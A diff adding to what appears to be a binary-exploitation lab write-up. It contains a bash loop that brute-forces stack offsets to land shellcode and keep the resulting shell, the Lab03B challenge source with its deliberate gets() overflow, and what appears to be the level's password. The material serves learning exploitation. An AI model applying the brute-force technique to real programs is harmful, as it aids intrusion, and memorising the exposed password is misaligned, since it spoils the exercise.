@@ -107,4 +107,101 @@ And we get our shell!
 
 I'd like to go back to this at some point and brute force the stack only attack. It should be easy enough, starting at the address we find with `gdb` increment the target address by 16 bytes and keep trying until we hit out shellcode.
 
+### Alternate Solution
+
+What a nightmare! Here's what we learned:
+1. Putting your shellcode at the end of the buffer isn't always a great idea since that part of the buffer isn't safe from being changed! At first I thought this gives the largest NOP sled, which it would, but it also lets your shellcode be changed which took a while to figure out.
+2. The addresses on the stack will change between runs, and depending on how you run the program. The best way around this is to brute force around a hypothesis address and check the return code. Further, you want to rerun the command within the same script. 
+
+```shell
+#!/bin/bash
+for offset in $(seq -1024 4 1024); do
+    echo "[*] Running with offset: $offset"
+    python /tmp/lab3C+.py $offset | ./lab3C > /dev/null
+    if [ $? -eq 0 ]; then
+        (python /tmp/lab3C+.py $offset; cat) | ./lab3C
+    fi
+done
+```
+
+
+
 ## Lab03B
+
+```C
+#include <signal.h>
+#include <assert.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/reg.h>
+#include <sys/prctl.h>
+#include <wait.h>
+#include "utils.h"
+
+ENABLE_TIMEOUT(60)
+
+/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */
+
+/* hint: write shellcode that opens and reads the .pass file.
+   ptrace() is meant to deter you from using /bin/sh shellcode */
+
+int main()
+{
+    pid_t child = fork();
+    char buffer[128] = {0};
+    int syscall = 0;
+    int status = 0;
+
+    if(child == 0)
+    {
+        prctl(PR_SET_PDEATHSIG, SIGHUP);
+        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+
+        /* this is all you need to worry about */
+        puts("just give me some shellcode, k");
+        gets(buffer);
+    }
+    else
+    {
+        /* mini exec() sandbox, you can ignore this */
+        while(1)
+        {
+            wait(&status);
+            if (WIFEXITED(status) || WIFSIGNALED(status)){
+                puts("child is exiting...");
+                break;
+            }
+
+            /* grab the syscall # */
+            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);
+
+            /* filter out syscall 11, exec */
+            if(syscall == 11)
+            {
+                printf("no exec() for you\n");
+                kill(child, SIGKILL);
+                break;
+            }
+        }
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+```
+..............................................................................................................................abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+
+```
+
+
+156 bytes
+
+
+wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
+
+
+## Lab03A
+
